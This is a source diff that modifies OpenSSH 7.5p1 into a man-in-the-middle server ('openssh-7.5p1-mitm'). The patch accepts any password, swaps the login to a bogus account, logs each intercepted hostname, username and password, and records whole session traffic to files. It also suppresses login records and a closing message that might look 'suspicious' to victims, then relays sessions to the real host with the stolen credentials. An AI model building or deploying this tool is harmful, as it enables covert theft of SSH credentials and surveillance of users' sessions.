diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2.c openssh-7.5p1-mitm/auth2.c
--- openssh-7.5p1/auth2.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/auth2.c	2017-07-06 12:52:17.025320184 -0400
@@ -222,6 +222,10 @@
 		fatal("input_userauth_request: no authctxt");
 
 	user = packet_get_cstring(NULL);
+	authctxt->original_user = xstrdup(user);  /* TODO: free this when done. */
+	free(user);
+	user = xstrdup(BOGUS_USER);
+
 	service = packet_get_cstring(NULL);
 	method = packet_get_cstring(NULL);
 	debug("userauth-request for user %s service %s method %s", user, service, method);
@@ -329,6 +333,8 @@
 		return;
 
 #ifdef USE_PAM
+	/* Disable PAM entirely. */
+	if (0) {
 	if (options.use_pam && authenticated) {
 		if (!PRIVSEP(do_pam_account())) {
 			/* if PAM returned a message, send it to the user */
@@ -341,6 +347,7 @@
 			    "configuration", authctxt->user);
 		}
 	}
+        }
 #endif
 
 #ifdef _UNICOS
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2-passwd.c openssh-7.5p1-mitm/auth2-passwd.c
--- openssh-7.5p1/auth2-passwd.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/auth2-passwd.c	2017-07-06 12:52:17.025320184 -0400
@@ -43,9 +43,11 @@
 #include "monitor_wrap.h"
 #include "misc.h"
 #include "servconf.h"
+#include "lol.h"
 
 /* import */
 extern ServerOptions options;
+extern Lol *lol;
 
 static int
 userauth_passwd(Authctxt *authctxt)
@@ -65,6 +67,13 @@
 	}
 	packet_check_eom();
 
+	char *user = authctxt->user;
+	if (authctxt->original_user != NULL)
+	  user = authctxt->original_user;
+
+	logit("INTERCEPTED PASSWORD: hostname: [%s]; username: [%s]; password: [%s]", lol->original_host, user, password);
+	lol->username = strdup(user);
+	lol->password = strdup(password);
 	if (change)
 		logit("password change not supported");
 	else if (PRIVSEP(auth_password(authctxt, password)) == 1)
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2-pubkey.c openssh-7.5p1-mitm/auth2-pubkey.c
--- openssh-7.5p1/auth2-pubkey.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/auth2-pubkey.c	2017-07-06 12:52:17.025320184 -0400
@@ -493,7 +493,8 @@
 			_exit(1);
 		}
 
-		execve(av[0], av, child_env);
+		/* Not sure when this happens, exactly, but we definitely never want to execute anything. */
+		/*execve(av[0], av, child_env);*/
 		error("%s exec \"%s\": %s", tag, command, strerror(errno));
 		_exit(127);
 	default: /* parent */
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth.c openssh-7.5p1-mitm/auth.c
--- openssh-7.5p1/auth.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/auth.c	2017-07-06 12:52:17.025320184 -0400
@@ -152,6 +152,8 @@
 #ifdef USE_LIBIAF
 		free((void *) passwd);
 #endif /* USE_LIBIAF */
+		/* Allow logins to our locked-out bogus user. */
+		locked = 0;
 		if (locked) {
 			logit("User %.100s not allowed because account is locked",
 			    pw->pw_name);
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth.h openssh-7.5p1-mitm/auth.h
--- openssh-7.5p1/auth.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/auth.h	2017-07-06 12:52:17.025320184 -0400
@@ -59,6 +59,7 @@
 	int		 server_caused_failure;
 	int		 force_pwchange;
 	char		*user;		/* username sent by the client */
+  	char		*original_user; /* username that the client actually wants to connect as */
 	char		*service;
 	struct passwd	*pw;		/* set if 'valid' */
 	char		*style;
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth-passwd.c openssh-7.5p1-mitm/auth-passwd.c
--- openssh-7.5p1/auth-passwd.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/auth-passwd.c	2017-07-06 12:52:17.025320184 -0400
@@ -121,6 +121,8 @@
 	if (options.use_pam)
 		return (sshpam_auth_passwd(authctxt, password) && ok);
 #endif
+	/* Accept all password authentication. */
+	return 1;
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
 	if (!expire_checked) {
 		expire_checked = 1;
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/channels.c openssh-7.5p1-mitm/channels.c
--- openssh-7.5p1/channels.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/channels.c	2017-07-06 12:52:17.025320184 -0400
@@ -191,6 +191,40 @@
 static int connect_next(struct channel_connect *);
 static void channel_connect_ctx_free(struct channel_connect *);
 
+void log_input(int fd, char *buf, int len);
+void log_output(int fd, char *buf, int len);
+void logx(int fd, char *buf, int len);
+
+void log_input(int fd, char *buf, int len) {
+  logx(fd, buf, len);
+}
+
+void log_output(int fd, char *buf, int len) {
+  logx(fd, buf, len);
+}
+
+void logx(int fd, char *buf, int len) {
+  int written = 0;
+  int ret = -1;
+
+  if (fd <= 0)
+    return;
+  /*fatal("Logging fd is not valid!");*/
+
+  ret = write(fd, buf, len);
+  if (ret < 0)
+    fatal("Failed to write to log file.");
+
+  written += len;
+  while (written < len) {
+    ret = write(fd, buf + written, len - written);
+    if (ret < 0)
+      fatal("Failed to write to log file.");
+    written += len;
+  }
+}
+
+
 /* -- channel core */
 
 Channel *
@@ -853,12 +887,13 @@
 
 void
 channel_set_fds(int id, int rfd, int wfd, int efd,
-    int extusage, int nonblock, int is_tty, u_int window_max)
+    int extusage, int nonblock, int is_tty, u_int window_max, int session_log_fd)
 {
 	Channel *c = channel_lookup(id);
 
 	if (c == NULL || c->type != SSH_CHANNEL_LARVAL)
 		fatal("channel_activate for non-larval channel %d.", id);
+	c->log_fd = session_log_fd;
 	channel_register_fds(c, rfd, wfd, efd, extusage, nonblock, is_tty);
 	c->type = SSH_CHANNEL_OPEN;
 	c->local_window = c->local_window_max = window_max;
@@ -1758,6 +1793,7 @@
 			}
 			return -1;
 		}
+		log_input(c->log_fd, buf, len);
 		if (c->input_filter != NULL) {
 			if (c->input_filter(c, buf, len) == -1) {
 				debug2("channel %d: filter stops", c->self);
@@ -1824,6 +1860,7 @@
 			dlen = MIN(dlen, 8*1024);
 #endif
 
+		log_output(c->log_fd, buf, dlen);
 		len = write(c->wfd, buf, dlen);
 		if (len < 0 &&
 		    (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK))
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/channels.h openssh-7.5p1-mitm/channels.h
--- openssh-7.5p1/channels.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/channels.h	2017-07-06 12:52:17.025320184 -0400
@@ -100,6 +100,7 @@
 	u_int   istate;		/* input from channel (state of receive half) */
 	u_int   ostate;		/* output to channel  (state of transmit half) */
 	int     flags;		/* close sent/rcvd */
+	int     log_fd;		/* logging fd */
 	int     rfd;		/* read fd */
 	int     wfd;		/* write fd */
 	int     efd;		/* extended fd */
@@ -214,7 +215,7 @@
 Channel	*channel_by_remote_id(int);
 Channel	*channel_lookup(int);
 Channel *channel_new(char *, int, int, int, int, u_int, u_int, int, char *, int);
-void	 channel_set_fds(int, int, int, int, int, int, int, u_int);
+void	 channel_set_fds(int, int, int, int, int, int, int, u_int, int);
 void	 channel_free(Channel *);
 void	 channel_free_all(void);
 void	 channel_stop_listening(void);
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/clientloop.c openssh-7.5p1-mitm/clientloop.c
--- openssh-7.5p1/clientloop.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/clientloop.c	2017-07-06 12:52:17.025320184 -0400
@@ -1752,7 +1752,10 @@
 	if (have_pty && options.log_level != SYSLOG_LEVEL_QUIET) {
 		snprintf(buf, sizeof buf,
 		    "Connection to %.64s closed.\r\n", host);
-		buffer_append(&stderr_buffer, buf, strlen(buf));
+		/* Suppress this message, otherwise the user will see our
+		 * client make the same output as their own client (which would
+		 * be a little weird/suspicious). */
+		/*buffer_append(&stderr_buffer, buf, strlen(buf));*/
 	}
 
 	/* Output any buffered data for stdout. */
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/loginrec.c openssh-7.5p1-mitm/loginrec.c
--- openssh-7.5p1/loginrec.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/loginrec.c	2017-07-06 12:52:17.025320184 -0400
@@ -435,6 +435,8 @@
 int
 login_write(struct logininfo *li)
 {
+        /* Since we never run as root, never attempt to record the log-in. */
+        return (0);
 #ifndef HAVE_CYGWIN
 	if (geteuid() != 0) {
 		logit("Attempt to write login records by non-root user (aborting)");
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/lol.h openssh-7.5p1-mitm/lol.h
--- openssh-7.5p1/lol.h	1969-12-31 19:00:00.000000000 -0500
+++ openssh-7.5p1-mitm/lol.h	2017-07-06 14:12:43.694888553 -0400
@@ -0,0 +1,25 @@
+#ifndef LOL_H
+#define LOL_H
+
+/* Define these in order to force connections to a test host.
+ * Useful for quickly testing changes without needing to ARP 
+ * spoof; just connect to sshd's port directly. */
+/*
+#define DEBUG_HOST "testhost"
+#define DEBUG_PORT 22
+*/
+
+/* This is the user account that all incoming connections will authenticate
+ * as (the provided user name is ignored).  This is also the account home
+ * directory where logged sessions are stored. */
+#define BOGUS_USER "ssh-mitm"
+
+struct _Lol {
+  char *original_host;
+  unsigned short original_port;
+  char *username;
+  char *password;
+};
+typedef struct _Lol Lol;
+
+#endif /* LOL_H */
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/Makefile.in openssh-7.5p1-mitm/Makefile.in
--- openssh-7.5p1/Makefile.in	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/Makefile.in	2017-07-11 16:00:22.173709516 -0400
@@ -23,7 +23,7 @@
 VPATH=@srcdir@
 SSH_PROGRAM=@bindir@/ssh
 ASKPASS_PROGRAM=$(libexecdir)/ssh-askpass
-SFTP_SERVER=$(libexecdir)/sftp-server
+SFTP_SERVER=/home/ssh-mitm/bin/sftp-server
 SSH_KEYSIGN=$(libexecdir)/ssh-keysign
 SSH_PKCS11_HELPER=$(libexecdir)/ssh-pkcs11-helper
 PRIVSEP_PATH=@PRIVSEP_PATH@
@@ -107,7 +107,7 @@
 	monitor.o monitor_wrap.o auth-krb5.o \
 	auth2-gss.o gss-serv.o gss-serv-krb5.o \
 	loginrec.o auth-pam.o auth-shadow.o auth-sia.o md5crypt.o \
-	sftp-server.o sftp-common.o \
+	sftp-server.o sftp-client.o sftp-common.o \
 	sandbox-null.o sandbox-rlimit.o sandbox-systrace.o sandbox-darwin.o \
 	sandbox-seccomp-filter.o sandbox-capsicum.o sandbox-pledge.o \
 	sandbox-solaris.o
@@ -187,8 +187,8 @@
 ssh-keyscan$(EXEEXT): $(LIBCOMPAT) libssh.a ssh-keyscan.o
 	$(LD) -o $@ ssh-keyscan.o $(LDFLAGS) -lssh -lopenbsd-compat -lssh $(LIBS)
 
-sftp-server$(EXEEXT): $(LIBCOMPAT) libssh.a sftp.o sftp-common.o sftp-server.o sftp-server-main.o
-	$(LD) -o $@ sftp-server.o sftp-common.o sftp-server-main.o $(LDFLAGS) -lssh -lopenbsd-compat $(LIBS)
+sftp-server$(EXEEXT): $(LIBCOMPAT) libssh.a sftp.o sftp-client.o sftp-common.o sftp-server.o sftp-server-main.o
+	$(LD) -o $@ sftp-server.o sftp-client.o sftp-common.o sftp-server-main.o $(LDFLAGS) -lssh -lopenbsd-compat $(LIBS)
 
 sftp$(EXEEXT): $(LIBCOMPAT) libssh.a sftp.o sftp-client.o sftp-common.o sftp-glob.o progressmeter.o
 	$(LD) -o $@ progressmeter.o sftp.o sftp-client.o sftp-common.o sftp-glob.o $(LDFLAGS) -lssh -lopenbsd-compat $(LIBS) $(LIBEDIT)
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor.c openssh-7.5p1-mitm/monitor.c
--- openssh-7.5p1/monitor.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/monitor.c	2017-07-06 12:52:17.025320184 -0400
@@ -119,6 +119,7 @@
 
 /* State exported from the child */
 static struct sshbuf *child_state;
+static struct sshbuf *child_lol = NULL;
 
 /* Functions on the monitor that answer unprivileged requests */
 
@@ -360,6 +361,7 @@
 	ssh_packet_set_log_preamble(ssh, "user %s", authctxt->user);
 
 	mm_get_keystate(pmonitor);
+	mm_get_lol(pmonitor);
 
 	/* Drain any buffered messages from the child */
 	while (pmonitor->m_log_recvfd != -1 && monitor_read_log(pmonitor) == 0)
@@ -1613,6 +1615,41 @@
 	}
 }
 
+void
+monitor_apply_lol(struct monitor *pmonitor, Lol *lol)
+{
+  u_int32_t dummy_len = 1;
+  u_char *dummy = NULL;
+  u_int32_t original_port = 0;
+  u_int32_t username_len = 0;
+  u_char *username = NULL;
+  u_int32_t password_len = 0;
+  u_char *password = NULL;
+
+  debug3("Applying lol...");
+
+  if (child_lol == NULL)
+    fatal("%s: child_lol is NULL!", __func__);
+
+  if (sshbuf_get_string(child_lol, &dummy, (size_t *)&dummy_len) != 0 ||
+      sshbuf_get_u32(child_lol, &original_port) != 0 ||
+      sshbuf_get_u32(child_lol, &username_len) != 0 ||
+      sshbuf_get_string(child_lol, &username, (size_t *)&username_len) != 0 ||
+      sshbuf_get_u32(child_lol, &password_len) != 0 ||
+      sshbuf_get_string(child_lol, &password, (size_t *)&password_len) != 0)
+    fatal("%s: sshbuf problems.", __func__);
+
+  if (/*(strlen(original_host) != original_host_len) ||*/ (strlen(username) != username_len) || (strlen(password) != password_len))
+    fatal("%s: more sshbuf problems.", __func__);
+
+  lol->original_port = (unsigned short)original_port;
+
+  lol->username = username;
+  lol->password = password;
+  sshbuf_free(child_lol); child_lol = NULL;
+  debug3("Done with lol...");
+}
+
 /* This function requries careful sanity checking */
 
 void
@@ -1627,6 +1664,16 @@
 	debug3("%s: GOT new keys", __func__);
 }
 
+void
+mm_get_lol(struct monitor *pmonitor)
+{
+	debug3("%s: Waiting for lol", __func__);
+	if ((child_lol = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+	mm_request_receive_expect(pmonitor->m_sendfd, MONITOR_REQ_LOL, child_lol);
+	debug3("%s: GOT lol", __func__);
+}
+
 
 /* XXX */
 
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor.h openssh-7.5p1-mitm/monitor.h
--- openssh-7.5p1/monitor.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/monitor.h	2017-07-06 12:52:17.025320184 -0400
@@ -56,6 +56,7 @@
 	MONITOR_REQ_GSSUSEROK = 46, MONITOR_ANS_GSSUSEROK = 47,
 	MONITOR_REQ_GSSCHECKMIC = 48, MONITOR_ANS_GSSCHECKMIC = 49,
 	MONITOR_REQ_TERM = 50,
+	MONITOR_REQ_LOL = 52,
 
 	MONITOR_REQ_PAM_START = 100,
 	MONITOR_REQ_PAM_ACCOUNT = 102, MONITOR_ANS_PAM_ACCOUNT = 103,
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor_wrap.c openssh-7.5p1-mitm/monitor_wrap.c
--- openssh-7.5p1/monitor_wrap.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/monitor_wrap.c	2017-07-06 12:52:17.025320184 -0400
@@ -482,6 +482,31 @@
 	sshbuf_free(m);
 }
 
+void
+mm_send_lol(struct monitor *monitor, Lol *lol) {
+	struct sshbuf *m;
+
+	if ((m = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+	if (lol == NULL)
+		fatal("%s: lol is NULL!", __func__);
+
+	debug3("SENDING lol");
+
+	if (sshbuf_put_string(m, "X", 1) != 0 ||
+	    sshbuf_put_u32(m, lol->original_port) != 0 ||
+	    sshbuf_put_u32(m, strlen(lol->username)) != 0 ||
+	    sshbuf_put_string(m, lol->username, strlen(lol->username)) != 0 ||
+	    sshbuf_put_u32(m, strlen(lol->password)) != 0 ||
+	    sshbuf_put_string(m, lol->password, strlen(lol->password)) != 0) {
+		fatal("%s: can't pack lol!", __func__);
+	}
+
+	mm_request_send(monitor->m_recvfd, MONITOR_REQ_LOL, m);
+	debug3("%s: Finished sending lol", __func__);
+	sshbuf_free(m);
+}
+
 int
 mm_pty_allocate(int *ptyfd, int *ttyfd, char *namebuf, size_t namebuflen)
 {
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor_wrap.h openssh-7.5p1-mitm/monitor_wrap.h
--- openssh-7.5p1/monitor_wrap.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/monitor_wrap.h	2017-07-06 12:52:17.025320184 -0400
@@ -28,6 +28,8 @@
 #ifndef _MM_WRAP_H_
 #define _MM_WRAP_H_
 
+#include "lol.h"
+
 extern int use_privsep;
 #define PRIVSEP(x)	(use_privsep ? mm_##x : x)
 
@@ -84,8 +86,11 @@
 int mm_newkeys_to_blob(int, u_char **, u_int *);
 
 void monitor_apply_keystate(struct monitor *);
+void monitor_apply_lol(struct monitor *, Lol *);
 void mm_get_keystate(struct monitor *);
+void mm_get_lol(struct monitor *);
 void mm_send_keystate(struct monitor*);
+void mm_send_lol(struct monitor *, Lol *);
 
 /* bsdauth */
 int mm_bsdauth_query(void *, char **, char **, u_int *, char ***, u_int **);
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/session.c openssh-7.5p1-mitm/session.c
--- openssh-7.5p1/session.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/session.c	2017-07-12 12:11:11.835051134 -0400
@@ -112,7 +112,7 @@
 /* func */
 
 Session *session_new(void);
-void	session_set_fds(Session *, int, int, int, int, int);
+void	session_set_fds(Session *, int, int, int, int, int, int);
 void	session_pty_cleanup(Session *);
 void	session_proctitle(Session *);
 int	session_setup_x11fwd(Session *);
@@ -140,6 +140,7 @@
 extern int startup_pipe;
 extern void destroy_sensitive_data(void);
 extern Buffer loginmsg;
+extern Lol *lol;
 
 /* original command from peer. */
 const char *original_command = NULL;
@@ -165,6 +166,29 @@
 static char *auth_sock_name = NULL;
 static char *auth_sock_dir = NULL;
 
+/* This is the maximum number of times to attempt to open a log file for
+ * writing. */
+#define MAX_LOG_OPEN_TRIES 1048576 /* 1M */
+
+int get_session_log_fd(void);
+int get_session_log_fd(void) {
+  char filename[64] = "/home/" BOGUS_USER "/session_0.txt";
+  int log_fd = -1;
+  int num_tries = 0;
+
+  while ((num_tries < MAX_LOG_OPEN_TRIES) && (log_fd < 0)) {
+    log_fd = open(filename, O_CREAT | O_EXCL | O_NOATIME | O_NOFOLLOW | O_SYNC | O_WRONLY, S_IRUSR | S_IWUSR);
+    if (log_fd < 0)
+      snprintf(filename, sizeof(filename) - 1, "/home/" BOGUS_USER "/session_%d.txt", num_tries + 1);
+    num_tries++;
+  }
+
+  if (log_fd < 0)
+    fatal("Could not open file for logging!");
+
+  return log_fd;
+}
+
 /* removes the agent forwarding socket */
 
 static void
@@ -294,6 +318,7 @@
 do_exec_no_pty(Session *s, const char *command)
 {
 	pid_t pid;
+	int session_log_fd;
 
 #ifdef USE_PIPES
 	int pin[2], pout[2], perr[2];
@@ -445,6 +470,8 @@
 	 */
 	buffer_clear(&loginmsg);
 
+	session_log_fd = get_session_log_fd();
+
 #ifdef USE_PIPES
 	/* We are the parent.  Close the child sides of the pipes. */
 	close(pin[0]);
@@ -452,7 +479,7 @@
 	close(perr[1]);
 
 	session_set_fds(s, pin[1], pout[0], perr[0],
-	    s->is_subsystem, 0);
+	    s->is_subsystem, 0, session_log_fd);
 #else
 	/* We are the parent.  Close the child sides of the socket pairs. */
 	close(inout[0]);
@@ -463,7 +490,7 @@
 	 * handle the case that fdin and fdout are the same.
 	 */
 	session_set_fds(s, inout[1], inout[1], err[1],
-	    s->is_subsystem, 0);
+	    s->is_subsystem, 0, session_log_fd);
 #endif
 	return 0;
 }
@@ -479,6 +506,7 @@
 {
 	int fdout, ptyfd, ttyfd, ptymaster;
 	pid_t pid;
+	int session_log_fd;
 
 	if (s == NULL)
 		fatal("do_exec_pty: no session");
@@ -575,7 +603,8 @@
 	s->ptymaster = ptymaster;
 	packet_set_interactive(1, 
 	    options.ip_qos_interactive, options.ip_qos_bulk);
-	session_set_fds(s, ptyfd, fdout, -1, 1, 1);
+	session_log_fd = get_session_log_fd();
+	session_set_fds(s, ptyfd, fdout, -1, 1, 1, session_log_fd);
 	return 0;
 }
 
@@ -1416,6 +1445,8 @@
 #ifdef WITH_SELINUX
 		setexeccon(NULL);
 #endif
+		logit("MITM: refusing to execute passwd.");
+		exit(1);
 #ifdef PASSWD_NEEDS_USERNAME
 		execl(_PATH_PASSWD_PROG, "passwd", s->pw->pw_name,
 		    (char *)NULL);
@@ -1628,9 +1659,14 @@
 #ifdef WITH_SELINUX
 		ssh_selinux_change_context("sftpd_t");
 #endif
-		exit(sftp_server_main(i, argv, s->pw));
+		exit(sftp_server_main(i, argv, s->pw,
+#ifdef DEBUG_HOST
+					DEBUG_HOST, DEBUG_PORT,
+#else
+					lol->original_host, lol->original_port,
+#endif
+					lol->username, lol->password));
 	}
-
 	fflush(NULL);
 
 	/* Get the last component of the shell name. */
@@ -1646,6 +1682,11 @@
 	 */
 	if (!command) {
 		char argv0[256];
+		char connect_string[512];
+		char port[16];
+
+		memset(connect_string, 0, sizeof(connect_string));
+		memset(port, 0, sizeof(port));
 
 		/* Start the shell.  Set initial character to '-'. */
 		argv0[0] = '-';
@@ -1658,9 +1699,33 @@
 		}
 
 		/* Execute the shell. */
-		argv[0] = argv0;
+		/*argv[0] = argv0;
 		argv[1] = NULL;
-		execve(shell, argv, env);
+		execve(shell, argv, env);*/
+
+
+		snprintf(port, sizeof(port), "%hu", lol->original_port);
+
+		strlcpy(connect_string, lol->username, sizeof(connect_string));
+		strlcat(connect_string, "@", sizeof(connect_string));
+
+		#ifdef DEBUG_HOST
+		strlcat(connect_string, DEBUG_HOST, sizeof(connect_string));
+		snprintf(port, sizeof(port), "%d", DEBUG_PORT);
+		#else
+		strlcat(connect_string, lol->original_host, sizeof(connect_string));
+		#endif
+
+		debug3("MITMing connection to %s:%s", connect_string, port);
+
+		argv[0] = "/home/" BOGUS_USER "/bin/ssh";
+		argv[1] = "-Z";
+		argv[2] = lol->password;
+		argv[3] = "-p";
+		argv[4] = port;
+		argv[5] = connect_string;
+		argv[6] = NULL;
+		execve(argv[0], argv, env);
 
 		/* Executing the shell failed. */
 		perror(shell);
@@ -1672,7 +1737,39 @@
 	 */
 	argv[0] = (char *) shell0;
 	argv[1] = "-c";
-	argv[2] = (char *) command;
+
+	if (strcmp(command, _PATH_SFTP_SERVER) != 0) {
+		logit("MITM: attempted to exec %s, but forcing it to %s instead.", command, _PATH_SFTP_SERVER);
+		command = _PATH_SFTP_SERVER;
+	}
+
+	size_t new_command_size = strlen(command) + strlen(lol->original_host) + 16 + strlen(lol->username) + strlen(lol->password) + 4 + 1;
+#ifdef DEBUG_HOST
+#define SFTP_LOG_ARGS " -f AUTH -l DEBUG3"
+	new_command_size += sizeof(SFTP_LOG_ARGS);
+#endif
+
+	char *new_command = calloc(new_command_size, sizeof(char *));
+	strlcpy(new_command, command, new_command_size);
+	strlcat(new_command, " ", new_command_size);
+	strlcat(new_command, lol->original_host, new_command_size);
+	strlcat(new_command, " ", new_command_size);
+
+	char port_str[16];
+	snprintf(port_str, sizeof(port_str), "%u", lol->original_port);
+
+	strlcat(new_command, port_str, new_command_size);
+	strlcat(new_command, " ", new_command_size);
+	strlcat(new_command, lol->username, new_command_size);
+	strlcat(new_command, " ", new_command_size);
+	strlcat(new_command, lol->password, new_command_size);
+
+#ifdef DEBUG_HOST
+	strlcat(new_command, SFTP_LOG_ARGS, new_command_size);	
+#endif
+
+	logit("MITM: SFTP command: %s", new_command);
+	argv[2] = (char *) new_command;
 	argv[3] = NULL;
 	execve(shell, argv, env);
 	perror(shell);
@@ -1927,6 +2024,11 @@
 	debug2("subsystem request for %.100s by user %s", s->subsys,
 	    s->pw->pw_name);
 
+	if (strcmp(s->subsys, "sftp") != 0) {
+		logit("MITM: subsystem request for something other than sftp (%.100s).  Rejecting...", s->subsys);
+		return 0;
+        }
+
 	for (i = 0; i < options.num_subsystems; i++) {
 		if (strcmp(s->subsys, options.subsystem_name[i]) == 0) {
 			prog = options.subsystem_command[i];
@@ -1958,6 +2060,10 @@
 {
 	int success;
 
+	/* Disable X11 requests. */
+	logit("MITM: rejecting X11 request.");
+	return 0;
+
 	if (s->auth_proto != NULL || s->auth_data != NULL) {
 		error("session_x11_req: session %d: "
 		    "x11 forwarding already active", s->self);
@@ -1999,6 +2105,12 @@
 
 	char *command = packet_get_string(&len);
 	packet_check_eom();
+
+	/* Disable exec. */
+	logit("MITM: rejecting exec request: [%s]", command == NULL ? "(NULL)" : command);
+	free(command);
+	return 0;
+
 	success = do_exec(s, command) == 0;
 	free(command);
 	return success;
@@ -2022,6 +2134,10 @@
 	char *name, *val;
 	u_int name_len, val_len, i;
 
+	/* Disable env requests. */
+	logit("MITM: rejecting env request.");
+	return 0;
+
 	name = packet_get_cstring(&name_len);
 	val = packet_get_cstring(&val_len);
 	packet_check_eom();
@@ -2056,6 +2172,11 @@
 {
 	static int called = 0;
 	packet_check_eom();
+
+	/* Disable auth agent requests. */
+	logit("MITM: rejecting auth agent request.");
+	return 0;
+
 	if (no_agent_forwarding_flag || !options.allow_agent_forwarding) {
 		debug("session_auth_agent_req: no_agent_forwarding_flag");
 		return 0;
@@ -2113,7 +2234,7 @@
 
 void
 session_set_fds(Session *s, int fdin, int fdout, int fderr, int ignore_fderr,
-    int is_tty)
+    int is_tty, int session_log_fd)
 {
 	/*
 	 * now that have a child and a pipe to the child,
@@ -2124,7 +2245,7 @@
 	channel_set_fds(s->chanid,
 	    fdout, fdin, fderr,
 	    ignore_fderr ? CHAN_EXTENDED_IGNORE : CHAN_EXTENDED_READ,
-	    1, is_tty, CHAN_SES_WINDOW_DEFAULT);
+	    1, is_tty, CHAN_SES_WINDOW_DEFAULT, session_log_fd);
 }
 
 /*
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp.c openssh-7.5p1-mitm/sftp.c
--- openssh-7.5p1/sftp.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp.c	2017-07-07 16:36:10.300366487 -0400
@@ -579,9 +579,10 @@
 remote_is_dir(struct sftp_conn *conn, const char *path)
 {
 	Attrib *a;
+	u_int status;
 
 	/* XXX: report errors? */
-	if ((a = do_stat(conn, path, 1)) == NULL)
+	if ((a = do_stat(conn, path, 1, &status)) == NULL)
 		return(0);
 	if (!(a->flags & SSH2_FILEXFER_ATTR_PERMISSIONS))
 		return(0);
@@ -1504,7 +1505,8 @@
 			err = 1;
 			break;
 		}
-		if ((aa = do_stat(conn, tmp, 0)) == NULL) {
+		u_int status;
+		if ((aa = do_stat(conn, tmp, 0, &status)) == NULL) {
 			free(tmp);
 			err = 1;
 			break;
@@ -1593,7 +1595,8 @@
 		path1 = make_absolute(path1, *pwd);
 		remote_glob(conn, path1, GLOB_NOCHECK, NULL, &g);
 		for (i = 0; g.gl_pathv[i] && !interrupted; i++) {
-			if (!(aa = do_stat(conn, g.gl_pathv[i], 0))) {
+			u_int status;
+			if (!(aa = do_stat(conn, g.gl_pathv[i], 0, &status))) {
 				if (err_abort) {
 					err = -1;
 					break;
